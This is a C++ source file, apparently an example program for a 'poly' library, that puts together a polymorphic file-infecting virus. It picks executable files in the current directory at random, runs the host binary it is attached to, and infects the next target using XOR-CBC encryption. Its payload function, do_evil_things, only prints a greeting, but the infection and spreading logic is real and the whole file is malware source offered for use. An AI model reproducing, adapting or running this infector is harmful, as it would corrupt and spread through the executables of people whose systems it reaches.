#include <cstdlib>

#include <iostream>
#include <vector>

#include <poly/poly.hpp>

struct TargetSelectPolicy {
    TargetSelectPolicy() noexcept : dir_paths{} {
        for (auto &entry : poly::fs::directory_iterator{"."}) {
            auto path = entry.path();
            if (((poly::fs::status(path).permissions() &
                  poly::fs::perms::others_exec) != poly::fs::perms::none) &&
                !entry.is_directory()) {
                this->dir_paths.push_back(path);
            }
        }
    }

    poly::fs::path next_target(poly::fs::path program) noexcept {
        poly::fs::path res;
        do {
            res = poly::RandomGenerator::get_generator().random_from(
                this->dir_paths);
        } while (poly::fs::equivalent(res, program));

        return res;
    }

  private:
    std::vector<poly::fs::path> dir_paths;
};

struct BlockingExec {
    BlockingExec() noexcept : result_{0} {};

    void exec(const poly::fs::path &program, int argc, char **const argv,
              char **const envp) noexcept {
        std::string cmd = program.string();

        for (auto i = 1; i < argc; i++) {
            cmd += " " + std::string(argv[i]);
        }

        this->result_ = std::system(cmd.c_str());
#ifndef POLY_WINDOWS
        this->result_ = WEXITSTATUS(this->result_);
#endif
    }

    inline void wait() noexcept { return; }

    inline int get_result() const noexcept { return this->result_; }

  private:
    int result_;
};

using Cipher = poly::Cipher<
    poly::CipherMode::kCBC,
    poly::EncryptionAlgorithm<poly::EncryptionAlgorithmType::kXor>>;

void do_evil_things() { std::cout << "Hello from poly!\n"; }

int main(int argc, char **argv, char **envp) {
    auto virus = poly::Virus<TargetSelectPolicy, BlockingExec, Cipher>::build(
        argc, argv, envp);

    if (virus == nullptr) {
        return 1;
    }

    auto res = virus->exec_attached_program();
    bool has_attached_bin = res == poly::Error::kNone;

    if (res != poly::Error::kNone && res != poly::Error::kNoTargetAttached) {
        return 2;
    }

    if (virus->infect_next() != poly::Error::kNone) {
        return 3;
    }
    virus->wait_exec_end();

    do_evil_things();

    if (has_attached_bin) {
        return virus->exec_result();
    } else {
        return 0;
    }
}